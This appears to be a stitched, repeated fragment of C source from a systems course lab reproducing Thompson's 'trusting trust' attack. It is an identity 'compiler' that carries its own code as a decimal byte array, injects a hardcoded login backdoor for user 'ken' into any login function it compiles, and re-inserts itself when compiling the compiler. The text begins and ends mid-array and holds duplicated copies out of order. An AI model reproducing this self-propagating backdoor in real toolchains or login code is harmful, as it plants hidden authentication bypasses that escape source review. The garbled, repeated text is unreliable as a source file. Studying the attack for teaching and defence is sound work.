	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
